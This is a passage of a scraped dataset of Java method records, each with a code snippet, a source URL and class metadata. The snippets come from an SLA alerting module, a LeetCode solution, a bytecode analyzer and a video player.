buildRTXSlaMessageText(slaOption, flow, \"Flow\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_FLOW_SUCCEED)) {      return buildRTXSlaMessageText(slaOption, flow, \"Flow\", \"Succeed\");    } else if (type.equals(SlaOption.TYPE_JOB_FINISH)) {      return buildRTXSlaMessageText(slaOption, flow, \"Job\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCEED)) {      return buildRTXSlaMessageText(slaOption, flow, \"Job\", \"Succeed\");    } else {      return \"Unrecognized SLA type \" + type;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "createEmailSlaMessage", "params": ["SlaOption", "ExecutableFlow"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String createEmailSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_FINISH)) {      return buildEmailSlaMessageText(slaOption, flow, \"Flow\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_FLOW_SUCCEED)) {      return buildEmailSlaMessageText(slaOption, flow, \"Flow\", \"Succeed\");    } else if (type.equals(SlaOption.TYPE_JOB_FINISH)) {      return buildEmailSlaMessageText(slaOption, flow, \"Job\", \"Finish\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCEED)) {      return buildEmailSlaMessageText(slaOption, flow, \"Job\", \"Succeed\");    } else {      return \"Unrecognized SLA type \" + type;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "buildRTXSlaMessageText", "params": ["SlaOption", "ExecutableFlow", "String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String buildRTXSlaMessageText(final SlaOption slaOption, final ExecutableFlow flow, String taskType, String runStatus){    final int execId = flow.getExecutionId();    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName =          (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      final String duration =          (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your flow \" + flowName + \" failed to \" + runStatus + \" within \" + duration + \"\\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : \\n\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"\\n\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getStartTime())) + \"\\n\";              //+ \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getEndTime())) + \"\\n\";      final String actual = \"\u5de5\u4f5c\u6d41\u73b0\u5728\u7684\u72b6\u6001\u662f \" + flow.getStatus() + \".\\n\";      return basicinfo + expected + actual;    }else if (\"Job\".equals(taskType)) {      final String jobName =          (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      final String duration =          (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your job \" + jobName + \" failed to \" + runStatus + \" within \" + duration + \"\\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : \\n\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u4efb\u52a1: \" + jobName + \"\\n\"              + \"\u4efb\u52a1\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"\\n\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \"\\n\";              //+ \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \"\\n\";      final String actual = \"\u4efb\u52a1\u73b0\u5728\u7684\u72b6\u6001\u662f \" + job.getStatus() + \".\\n\";      return basicinfo + expected + actual;    } else {      return \"\u672a\u5339\u914d\u5230\u4efb\u52a1\u7c7b\u578b\";    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "buildEmailSlaMessageText", "params": ["SlaOption", "ExecutableFlow", "String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String buildEmailSlaMessageText(final SlaOption slaOption, final ExecutableFlow flow, String taskType, String runStatus){    final int execId = flow.getExecutionId();    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      final String duration = (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your flow \" + flowName + \" failed to \" + runStatus + \" within \" + duration + \"</br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : </br>\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"</br>\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"</br>\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getStartTime())) + \"</br>\";              //+ \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(flow.getEndTime())) + \"</br>\";      final String actual = \"\u5de5\u4f5c\u6d41\u73b0\u5728\u7684\u72b6\u6001\u662f \" + flow.getStatus() + \".</br>\";      return basicinfo + expected + actual;    }else if (\"Job\".equals(taskType)) {      final String jobName = (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      final String duration = (String) slaOption.getInfo().get(SlaOption.INFO_DURATION);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicinfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicinfo = \"SLA \u544a\u8b66: Your job \" + jobName + \" failed to \" + runStatus + \" within \" + duration + \"</br>\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b : </br>\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"</br>\"              + \"\u4efb\u52a1: \" + jobName + \"</br>\"              + \"\u4efb\u52a1\u9884\u8ba1\u8d85\u65f6\u65f6\u95f4: \" + duration + \"</br>\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \"</br>\";              //+ \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \"</br>\";      final String actual = \"\u4efb\u52a1\u73b0\u5728\u7684\u72b6\u6001\u662f \" + job.getStatus() + \".</br>\";      return basicinfo + expected + actual;    } else {      return \"\u672a\u5339\u914d\u5230\u4efb\u52a1\u7c7b\u578b\";    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "flowStartTimeChecker", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["private", "static"], "return_type": "long", "snippet": "  private static long flowStartTimeChecker(final ExecutableFlow flow){    if(-1 == flow.getStartTime()){      return flow.getEndTime();    } else {      return flow.getStartTime();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void main(String[] args) {    String time = fmt.print(new DateTime(0));    System.out.printf(time);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnFailedUpdate", "params": ["Executor", "List<ExecutableFlow>", "ExecutorManagerException"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnFailedUpdate(Executor executor, List<ExecutableFlow> executions, ExecutorManagerException e) {    // TODO  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnCycleFlowInterrupt", "params": ["ExecutableFlow", "ExecutionCycle", "List<String>", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnCycleFlowInterrupt(ExecutableFlow flow, ExecutionCycle cycleFlow, List<String> emails, String alertLevel, String... extraReasons) {    String newTitle = String.format(\"[%s:%s] %s\", flow.getProjectName(), flow.getFlowId(), this.title);    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if (imsAlerterWays.contains(\"2\")) {      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 webank \u90ae\u7bb1\u544a\u8b66\");      String webankAlertEmail = createCycleFlowAlertMessage(flow, cycleFlow, emails, \"</br>\");      handleWebankAlert(webankAlertEmail, emails, AlertLevel.valueOf(alertLevel), newTitle);    }    if (imsAlerterWays.contains(\"3\")) {      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 webank \u5fae\u4fe1\u544a\u8b66\");      String slaMessageWeChat = createCycleFlowAlertMessage(flow, cycleFlow, emails, \"\\n\");      handleWebankAlert(slaMessageWeChat, emails, AlertLevel.valueOf(alertLevel), newTitle);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "createCycleFlowAlertMessage", "params": ["ExecutableFlow", "ExecutionCycle", "List<String>", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String createCycleFlowAlertMessage(ExecutableFlow f, ExecutionCycle flow, List<String> emails, String lineSeparator) {    //\u83b7\u53d6\u9009\u9879\u8bbe\u7f6e    StringBuffer stringBuffer = new StringBuffer();    List<String> contacts = emails.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    stringBuffer.append(lineSeparator);    stringBuffer.append(\"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + lineSeparator);    String header = \"WTSS\u5faa\u73af\u5de5\u4f5c\u6d41\u88ab\u4e2d\u65ad\uff0c\u8be6\u60c5\u5982\u4e0b\uff1a\";    stringBuffer.append(header);    stringBuffer.append(\"  \" + lineSeparator + \"\u9879\u76eeID: \");    stringBuffer.append(flow.getProjectId());    stringBuffer.append(\";  \" + lineSeparator + \"\u9879\u76ee\u540d\u79f0: \");    stringBuffer.append(f.getProjectName());    stringBuffer.append(\";  \" + lineSeparator + \"\u5de5\u4f5c\u6d41\u540d\u79f0: \");    stringBuffer.append(flow.getFlowId());    stringBuffer.append(\";  \" + lineSeparator + \"\u6267\u884cID: \");    stringBuffer.append(flow.getCurrentExecId());    stringBuffer.append(\";  \" + lineSeparator + \"\u63d0\u4ea4\u4eba: \") ;    stringBuffer.append(flow.getSubmitUser());    stringBuffer.append(\";  \" + lineSeparator + \"\u63d0\u4ea4\u65f6\u95f4: \") ;    stringBuffer.append(fmt.print(new DateTime(flow.getSubmitTime())));    stringBuffer.append(\";  \" + lineSeparator + \"\u4ee3\u7406\u7528\u6237: \") ;    stringBuffer.append(f.getProxyUsers());    stringBuffer.append(\";  \" + lineSeparator + \"\u5f00\u59cb\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getStartTime())));    stringBuffer.append(\";  \" + lineSeparator + \"\u7ed3\u675f\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getEndTime())));    stringBuffer.append(\";  \" + lineSeparator + \"\u8017\u65f6: \");    stringBuffer.append(Utils.formatDuration(flow.getStartTime(), flow.getEndTime()));    stringBuffer.append(\";  \" + lineSeparator + \"\u72b6\u6001: \");    stringBuffer.append(flow.getStatus());    if(f.getExecutionOptions().getDisabledJobs().size()>0) {      stringBuffer.append(lineSeparator + \"disabled job(\");      List<Object> disableJobs = f.getExecutionOptions().getDisabledJobs();      for (Object djob : disableJobs) {        stringBuffer.append(\"; \" + lineSeparator + djob + \"\u3001\");      }      stringBuffer.append(lineSeparator + \")\");    }    return stringBuffer.toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "move", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void move()\t{\t\tSystem.out.println(\"\u00b6\u00af\u00ce\u00ef\u00d4\u00b0\u00c0\u00ef\u00d3\u00d0\u00ca\u00b2\u00c3\u00b4\u00a3\u00bf\");\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Fangfafugaitest.java", "stars": "2", "class": {"name": "Fangfafugaitest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTax", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double getTax() {\t\tif (income <= 5000) {\t\t\treturn 0;\t\t}\t\treturn (income - 5000) * 0.2;\t}", "url": "https://raw.githubusercontent.com/IzzyPrime/JavaWorkspace/master/JavaPractice/part2/src/com/opp/polymorphic/SalaryIncome.java", "stars": "2", "class": {"name": "SalaryIncome", "extends": "Income", "implements": null, "modifiers": ["public"]}}, {"method_name": "moveZeroes", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void moveZeroes(int[] nums) {        int partitionIndex = 0;        for(int i = 0; i < nums.length; i ++) {            if(nums[i] != 0) {                int temp = nums[i];                nums[i] = nums[partitionIndex];                nums[partitionIndex] = temp;                partitionIndex ++;            }        }    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/MoveZeroes.java", "stars": "1", "class": {"name": "MoveZeroes", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "ofVirtual", "params": ["AbstractInsnNode", "TypeChecker", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "VirtualValue", "snippet": "\tpublic static VirtualValue ofVirtual(AbstractInsnNode insn, TypeChecker typeChecker, Type type) {\t\treturn new VirtualValue(insn, type, new Unresolved(type), typeChecker);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "ofVirtual", "params": ["List<AbstractInsnNode>", "TypeChecker", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "VirtualValue", "snippet": "\tpublic static VirtualValue ofVirtual(List<AbstractInsnNode> insns, TypeChecker typeChecker, Type type) {\t\treturn new VirtualValue(insns, type, new Unresolved(type), typeChecker);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "ofClass", "params": ["AbstractInsnNode", "TypeChecker", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "VirtualValue", "snippet": "\tpublic static VirtualValue ofClass(AbstractInsnNode insn, TypeChecker typeChecker, Type value) {\t\treturn new VirtualValue(insn, Type.getObjectType(\"java/lang/Class\"), value, typeChecker);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "ofMethodRef", "params": ["AbstractInsnNode", "TypeChecker", "Type"], "throws": null, "modifiers": ["public"], "return_type": "AbstractValue", "snippet": "\tpublic AbstractValue ofMethodRef(AbstractInsnNode insn, TypeChecker typeChecker, Type desc) {\t\t// Validate desc\t\tif (desc == null)\t\t\tthrow new IllegalStateException(\"Method descriptor must not be null\");\t\t// Don't act on 'null' values\t\tif (value == null || value.equals(Type.VOID_TYPE))\t\t\tthrow new IllegalStateException(\"Cannot act on null reference value\");\t\t// Don't try to do object stuff with non-objects\t\tif (!isReference())\t\t\tthrow new IllegalStateException(\"Cannot act on reference on non-reference value\");\t\t// Handle return types\t\tType retType = desc.getReturnType();\t\tif (retType.equals(Type.VOID_TYPE))\t\t\treturn null;\t\tif (retType.getSort() <= Type.DOUBLE)\t\t\treturn new PrimitiveValue(insn, retType);\t\treturn ofVirtual(insn, typeChecker, retType);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "copy", "params": ["AbstractInsnNode"], "throws": null, "modifiers": ["public"], "return_type": "AbstractValue", "snippet": "\tpublic AbstractValue copy(AbstractInsnNode insn) {\t\treturn new VirtualValue(combine(getInsns(), insn), getType(), getValue(), typeChecker);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "canMerge", "params": ["AbstractValue"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean canMerge(AbstractValue other) {\t\tif(other == this)\t\t\treturn true;\t\telse if(other instanceof NullConstantValue ||\t\t\t\tother == UninitializedValue.UNINITIALIZED_VALUE ||\t\t\t\tother == null)\t\t\treturn false;\t\telse if(type == null)\t\t\treturn other.type == null;\t\treturn type.equals(other.type) || isParent(type, other.type);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "isPrimitive", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isPrimitive() {\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "isReference", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isReference() {\t\treturn true;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "isValueResolved", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isValueResolved() {\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "equals", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean equals(Object other) {\t\tif (other == this)\t\t\treturn true;\t\telse if (other == UninitializedValue.UNINITIALIZED_VALUE)\t\t\treturn false;\t\telse if (other instanceof NullConstantValue)\t\t\treturn false;\t\telse if(other instanceof VirtualValue) {\t\t\tVirtualValue rOther = (VirtualValue) other;\t\t\tif (value instanceof StringBuilder || value instanceof StringBuffer)\t\t\t\treturn value.toString().equals(rOther.value.toString());\t\t\telse\t\t\t\treturn type.equals(rOther.type) && value.equals(rOther.value);\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "isParent", "params": ["Type", "Type"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isParent(Type parent, Type child) {\t\tif(parent == null || child == null)\t\t\tthrow new IllegalStateException(\"Cannot find common type of parent null type\");\t\telse if (parent.equals(child))\t\t\treturn true;\t\telse if(parent.getSort() == Type.OBJECT && child.getSort() == Type.OBJECT) {\t\t\tif(parent.equals(child))\t\t\t\treturn true;\t\t\treturn typeChecker.test(parent, child);\t\t} else\t\t\treturn parent.getSort() < Type.ARRAY && child.getSort() < Type.ARRAY;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/VirtualValue.java", "stars": "12", "class": {"name": "VirtualValue", "extends": "AbstractValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["Context", "Uri"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(Context context, Uri uri) {        throw new UnsupportedOperationException(\"Deprecated, try setDataSource(List<String> uris, Map<String, String> headers)\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["Context", "Uri", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(Context context, Uri uri, Map<String, String> headers) {        throw new UnsupportedOperationException(\"Deprecated, try setDataSource(List<String> uris, Map<String, String> headers)\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(String path) {        throw new UnsupportedOperationException(\"Deprecated, try setDataSource(List<String> uris, Map<String, String> headers)\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["FileDescriptor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(FileDescriptor fd) {        throw new UnsupportedOperationException(\"Deprecated, try setDataSource(List<String> uris, Map<String, String> headers)\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPositionDiscontinuity", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPositionDiscontinuity(int reason) {        super.onPositionDiscontinuity(reason);        notifyOnInfo(POSITION_DISCONTINUITY, reason);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["List<String>", "Map<String,String>", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(List<String> uris, Map<String, String> headers, boolean cache) {        mHeaders = headers;        if (uris == null) {            return;        }        ConcatenatingMediaSource concatenatedSource = new ConcatenatingMediaSource();        for (String uri : uris) {            MediaSource mediaSource = mExoHelper.getMediaSource(uri, isPreview, cache, false, mCacheDir,  getOverrideExtension());            concatenatedSource.addMediaSource(mediaSource);        }        mMediaSource = concatenatedSource;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "previous", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void previous() {        if (mInternalPlayer == null) {            return;        }        Timeline timeline = mInternalPlayer.getCurrentTimeline();        if (timeline.isEmpty()) {            return;        }        int windowIndex = mInternalPlayer.getCurrentWindowIndex();        timeline.getWindow(windowIndex, window);        int previousWindowIndex = mInternalPlayer.getPreviousWindowIndex();        if (previousWindowIndex != C.INDEX_UNSET                && (mInternalPlayer.getCurrentPosition() 